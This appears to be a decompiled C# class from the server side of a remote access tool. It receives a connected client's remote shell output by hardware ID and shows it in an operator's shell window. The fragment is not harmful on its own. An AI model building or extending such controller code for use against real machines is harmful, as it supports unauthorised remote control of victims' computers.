using System;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200008A RID: 138
	public class HandleShell
	{
		// Token: 0x0600043F RID: 1087 RVA: 0x00028958 File Offset: 0x00026B58
		public HandleShell(MsgPack unpack_msgpack, Clients client)
		{
			FormShell formShell = (FormShell)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
			if (formShell != null)
			{
				if (formShell.Client == null)
				{
					formShell.Client = client;
					formShell.timer1.Enabled = true;
				}
				formShell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
				formShell.richTextBox1.SelectionStart = formShell.richTextBox1.TextLength;
				formShell.richTextBox1.ScrollToCaret();
			}
		}
	}
}
